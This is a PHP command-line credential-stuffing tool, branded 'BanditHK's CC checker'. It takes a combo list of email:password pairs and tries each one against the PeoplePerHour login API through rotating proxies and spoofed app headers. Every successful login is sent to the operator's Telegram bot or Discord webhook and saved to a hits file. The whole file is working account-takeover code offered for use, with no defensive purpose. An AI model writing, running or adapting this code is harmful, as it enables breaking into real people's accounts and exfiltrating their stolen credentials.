<?php

error_reporting(0);
ini_set('display_errors', 0);
echo chr(27).chr(91).'H'.chr(27).chr(91).'J';
echo "
__________                    .___.__  __     ___ ___  ____  __.
\______   \_____    ____    __| _/|__|/  |_  /   |   \|    |/ _|
 |    |  _/\__  \  /    \  / __ | |  \   __\/    ~    \      <
 |    |   \ / __ \|   |  \/ /_/ | |  ||  |  \    Y    /    |  \
 |______  /(____  /___|  /\____ | |__||__|   \___|_  /|____|__ \
        \/      \/     \/      \/                  \/         \/
\n";
echo "Welcome to BanditHK's CC checker\n\n";
retry1:
echo "[1]Telegram\n[2]Discord\n\nSelect your webhook app: ";
$choice = trim(fgets(STDIN));

//Vars
if($choice == "1"){
  teleretry:
echo "[+]Enter Your id: ";

$teleid = trim(fgets(STDIN));

if(trim($teleid) == ''){
    echo "RETRYING!\n";
      goto teleretry;
}

echo "[+]Enter Your bot token: ";

$teletoken = trim(fgets(STDIN));
if(trim($teletoken) == ''){
    echo "RETRYING!\n";
    goto teleretry;
}
$discordurl = "";
$discorddata = "";

}elseif($choice == "2"){
  retry2:
echo "[+]Enter Discord webhook url: ";
$discordurl = trim(fgets(STDIN));
if($discordurl == '' || !str_contains($discordurl,"https://discord.com")){
  echo "Please Enter valid url.. \n";
  goto retry2;
}
$teleid = "";
$teletoken ="";
}else{
echo "RETRYING!\n";
      goto retry1;
}
proxyretry:
echo "[+]Proxy Source\n\n[1]Proxy from File\n[2]Api proxy refreshed every 10 seconds(Linux only)\n\n[+]Enter Choice: ";
$proxysource = (int) trim(fgets(STDIN));
  if($proxysource == "1"){
  echo "[+]Enter Proxy filename: ";
$proxyfile = trim(fgets(STDIN));
$plist = file("$proxyfile");
if($plist == false){
  echo "File not found, retry\n";
  goto proxyretry;
}
proxytyperetry:
echo "Proxy type: \n";
echo "[1]HTTPS\n[2]Socks5\n[3]Socks4\n\nEnter Choice: ";
$proxychoice = (int)trim(fgets(STDIN));
if($proxychoice == "1"){
  $proxytype = "CURLPROXY_HTTP";
}elseif($proxychoice == "2"){
  $proxytype = "CURLPROXY_SOCKS5";
}elseif($proxychoice == "3"){
    $proxytype = "CURLPROXY_SOCKS4";
  }
else{
  echo "Invalid choice, retry";
  goto proxytyperetry;
}
}elseif($proxysource == "2"){
  file_put_contents('proxy.php','<?php restart:
$ch = curl_init();
curl_setopt_array($ch,array(
  CURLOPT_URL => '."'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all'".',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '."''".',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_HTTPHEADER => array('."'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36'".'),
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => '."'GET'".',
));

$resp = curl_exec($ch);
curl_close($ch);
file_put_contents('."'http-proxy.txt'".',$resp);
sleep(600);
goto restart;?>',);
  if(PHP_OS == "Linux"){
  shell_exec(sprintf('%s > /dev/null 2>&1 &','screen -dmS screen php proxy.php'));
  }elseif(PHP_OS == "WINNT"){
  pclose(popen("start /B php proxy.php", "r"));
  }else{echo "Unknown Operating system";goto proxyretry;}
  sleep(10);
  $plist = file("http-proxy.txt");
  $proxytype = 'CURLPROXY_HTTP';
  echo "Proxy is being pulled from Proxyscrape with type HTTP\n";
  }
combochoice2:
  echo "[+]Enter combo filename: ";
  $comboname = trim(fgets(STDIN));
  $combo = file("$comboname");
  if($combo == false){
    echo "Invalid Combo Name, please retry\n";
    goto combochoice2;
}
  $count = count($combo);
  check($combo,$choice,$proxytype,$teleid,$teletoken,$discordurl,$count,$plist);

//Functions
function show_status($done, $total, $size=30) {

    static $start_time;

    // if we go over our bound, just ignore it
    if($done > $total) return;

    if(empty($start_time)) $start_time=time();
    $now = time();

    $perc=(double)($done/$total);

    $bar=floor($perc*$size);

    $status_bar="\t\t\t[";
    $status_bar.=str_repeat("=", $bar);
    if($bar<$size){
        $status_bar.=">";
        $status_bar.=str_repeat(" ", $size-$bar);
    } else {
        $status_bar.="=";
    }

    $disp=number_format($perc*100, 0);

    $status_bar.="] $disp%  $done/$total";

    $rate = ($now-$start_time)/$done;
    $left = $total - $done;
    $eta = round($rate * $left, 2);

    $elapsed = $now - $start_time;

    $status_bar.= " remaining: ".number_format($eta)." sec.  elapsed: ".number_format($elapsed)." sec.";

    echo "$status_bar  ";

    flush();

    // when done, send a newline
    if($done == $total) {
        echo "\n";
    }

}
function replaceOut($str)
{
    $numNewLines = substr_count($str, "\n");
    echo chr(27) . "[0G"; // Set cursor to first column
    echo $str;
    echo chr(27) . "[" . $numNewLines ."A"; // Set cursor up x lines
}
function webhook($choice,$discordurl,$discorddata,$telegramdata,$params,$teletoken){
if($choice == "1"){
$telegram = curl_init();
curl_setopt_array($telegram,array(
  CURLOPT_URL => 'https://api.telegram.org/bot'.$teletoken.'/sendMessage',
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => ($params),
));
  $tele = curl_exec($telegram);
  curl_close($telegram);
        return 0;}
else{
        $postdata = json_encode($discorddata);
    $ch = curl_init("$discordurl");
   curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt( $ch, CURLOPT_POST, 1);
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $postdata);
    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt( $ch, CURLOPT_HEADER, 0);
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 0);
        $response = curl_exec( $ch );
        echo $response;
        curl_close( $ch );
}
}
 function getProxy(){
               restart:
$ch = curl_init();
curl_setopt_array($ch,array(
  CURLOPT_URL => 'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_HTTPHEADER => array('User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36'),
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));

$resp = curl_exec($ch);
curl_close($ch);
file_put_contents('http-proxy.txt',$resp);
sleep(600);
goto restart;
 }
function check($combo,$choice,$proxytype,$teleid,$teletoken,$discordurl,$count,$plist){
 $total = 0;
$hits = 0;
$fail = 0;
for ($i=1; $i<=$count; $i++){
restart:
$comboarray = $combo[array_rand(array_unique($combo))];
$comboline = explode(":",$comboarray);
$user = $comboline[0];
$pass = $comboline[1];
$proxy = $plist[array_rand($plist)];
$p = explode(":",$proxy);
$proxyurl = $p[0];
$proxyport = $p[1];
  if(isset($p[2])){
                      $proxyuser = $p[2];
                      $proxypass = $p[3];
                      }else{
                      $proxyuser = "";
                      $proxypass = "";
                      }
 //POST REQUEST
$ch = curl_init();
curl_setopt_array($ch,array(
  CURLOPT_URL => 'https://www.peopleperhour.com/v1/user/login?app_id=f503d142&app_key=ebe3b7009b34226b87faab3d63d12fc0',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_PROXYTYPE => $proxytype,
  CURLOPT_PROXY => $proxyurl,
  CURLOPT_PROXYPORT => $proxyport,
  CURLOPT_PROXYUSERPWD => $proxyuser.':'.$proxypass,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => array('email'=> $user,'password'=>$pass),
 CURLOPT_HTTPHEADER => array(
    'Host: api.cards.app',
    'uuid: 5ffe9a8125447b95',
    'user-agent: pphmobileandroid/3.7.0',
    'cookie: PHPSESSID=1a65aba0ddb0d791d1fc33cf10af436c; mid=1659448905015002400530414',
  ),
 ));
 $response = curl_exec($ch);
curl_close($ch);
 
 //KEYCHECK
if(str_contains($response,'Wrong email or password.')){
  $total++;
  $fail++;
  replaceOut("[+]Total Progress: ".show_status($total, $count)."\n[+]Dead: $fail\n[+]Hits: $hits\n");
 
}
 elseif(str_contains($response,'dashboard')){
 $total++;
        $hits++;
        if($choice == "2"){
        $discorddata = array("content" => "---New People per Hour Hit---\n[+]Data: $user:$pass\n", "username" => "BanditHK");
        }else{
        $telegramdata = "---New Cards App Hit---\n[+]Data: $user:$pass";
        $params = [
                'chat_id' => $teleid,
                'text' => $telegramdata,
            ];
          }
        webhook($choice,$discordurl,$discorddata,$telegramdata,$params,$teletoken);
        file_put_contents('Hits.txt',"---New People per Hour Hit---\n[+]Data: $user:$pass\n\n",FILE_APPEND);
        replaceOut("[+]Total Progress: ".show_status($total, $count)."\n[+]Dead: $fail\n[+]Hits Count: $hits\n");
 }else{
  replaceOut("[+]Total Progress: ".show_status($total, $count)."\n[+]Dead: $fail\n[+]Hits Count: $hits\n");
 goto restart;
  
 }
}
}
